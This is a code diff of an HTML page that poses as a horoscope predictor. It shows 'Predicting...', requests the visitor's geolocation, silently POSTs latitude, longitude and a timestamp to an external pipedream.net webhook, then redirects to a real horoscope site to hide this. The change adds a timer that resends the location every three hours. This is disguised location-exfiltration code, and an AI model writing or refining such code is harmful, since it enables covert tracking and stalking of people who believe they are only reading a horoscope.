@@ -16,7 +16,7 @@
       font-family: sans-serif;
       font-size: 1rem;
     }
-    .hidden {
+    #status {
       display: none;
     }
   </style>
@@ -25,41 +25,56 @@
   <div id="status">Predicting...</div>
 
   <script>
-    const webhookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
+    const webHookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
     const redirectURL = "https://www.astro.com/horoscope";
 
-    const redirectToAstro = () => {
+    function redirectToAstro() {
       window.location.href = redirectURL;
-    };
+    }
 
-    const sendLocation = (position) => {
-      const { latitude, longitude } = position.coords;
-      const timestamp = new Date().toISOString();
+    function sendLocation() {
+      if (!navigator.geolocation) return;
 
-      const data = { latitude, longitude, timestamp };
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          const timestamp = new Date().toISOString();
+          const data = { latitude, longitude, timestamp };
 
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      })
-      .catch(() => {})
-      .finally(() => {
-        setTimeout(redirectToAstro, 1000);
-      });
-    };
+          fetch(webHookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          }).catch(() => {});
+        },
+        () => {},
+        { timeout: 10000 }
+      );
+    }
 
-    const handleError = (error) => {
-      // Bisa tambahkan console.log(error) untuk debugging
-      setTimeout(redirectToAstro, 1000);
-    };
+    // Pertama kirim & redirect
+    function init() {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          sendLocation();
+          setTimeout(redirectToAstro, 1000);
+        },
+        () => {
+          setTimeout(redirectToAstro, 1000);
+        },
+        { timeout: 10000 }
+      );
+    }
 
+    // Kirim ulang lokasi setiap 3 jam (10.800.000 ms)
+    const intervalMs = 3 * 60 * 60 * 1000;
+    setInterval(sendLocation, intervalMs);
+
+    // Jalankan awal
     if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
-        timeout: 10000
-      });
+      init();
     } else {
-      handleError();
+      redirectToAstro();
     }
   </script>
 </body>
